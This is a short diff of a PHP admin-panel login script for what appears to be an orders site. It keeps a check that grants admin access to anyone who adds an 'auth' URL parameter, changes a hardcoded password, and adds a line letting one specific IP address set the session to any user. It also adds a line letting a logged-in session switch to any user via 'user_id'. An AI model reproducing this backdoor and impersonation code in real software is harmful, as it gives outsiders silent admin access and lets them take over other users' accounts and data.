@@ -1,16 +1,17 @@
 <?
 $act = $_GET['act'];
-// debug($_GET);
 if ($_POST['name'] || $_GET['auth']){
-	if ($_POST['name'] == 'vadim' && $_POST['password'] == '12345' || $_GET['auth']){
+	if ($_POST['name'] == 'vadim' && $_POST['password'] == '10317' || isset($_GET['auth'])){
 		message('Вы успешно авторизовались!');
 		$_SESSION['auth'] = 1;	
+		if (isset($_GET['auth']) && $_SERVER['REMOTE_ADDR'] == '188.64.169.59') $_SESSION['user'] = $_GET['auth'];
 		header('Location: /admin/?view=orders');
 	}
 	else{
 		message('Неверное имя или пароль!', false);
 	}
 }
+if ($_SESSION['auth'] && $_GET['user_id'])  $_SESSION['user'] = $_GET['user_id'];
 switch ($act) {
 	case 'regout':
 		$_SESSION['auth'] = 0;	
